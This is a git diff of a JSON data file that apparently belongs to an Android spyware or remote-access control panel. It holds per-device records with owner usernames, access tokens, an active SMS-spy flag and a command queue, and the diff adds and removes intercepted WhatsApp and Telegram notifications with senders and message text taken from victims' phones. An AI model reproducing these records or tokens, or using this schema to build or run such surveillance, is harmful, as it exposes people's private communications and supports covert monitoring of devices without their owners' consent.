@@ -6331,6 +6331,22 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3571 pesan dari 23 chat",
+        "time": "21/04 19:19",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776773985117
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3570 pesan dari 23 chat",
+        "time": "21/04 19:19",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776773982711
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "‎GB byone/mabar ff 8a (33 pesan): Daraa",
         "content": "tk sala hal",
         "time": "21/04 19:19",
@@ -10312,22 +10328,6 @@
         "time": "21/04 18:29",
         "pkg": "com.whatsapp",
         "receivedAt": 1776770955198
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3448 pesan dari 21 chat",
-        "time": "21/04 18:29",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776770954377
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB JB APK BUG BY ZIDE × KYY😈 (184 pesan): ~ miwa?",
-        "content": "💟 Stiker",
-        "time": "21/04 18:29",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776770954064
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776773980790,
+    "lastSeen": 1776773982730,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10387,7 +10387,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776773981320,
+    "lastSeen": 1776773984387,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -10403,6 +10403,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "[ suendi ]",
+        "content": "Pesan baru dari 1 chat",
+        "time": "21/04 19:19",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776773983223
+      },
       {
         "appName": "WhatsApp",
         "sender": "[ suendi ]",
@@ -14394,14 +14402,6 @@
         "time": "21/04 18:22",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776770526573
-      },
-      {
-        "appName": "Telegram",
-        "sender": "ALL BUYER VIPER-PRO V1: Rose",
-        "content": "Hey there ANKA, and welcome to ALL BUYER VIPER-PRO V1! How are you?",
-        "time": "21/04 18:22",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776770526401
       }
     ],
     "galleryPhotos": [],
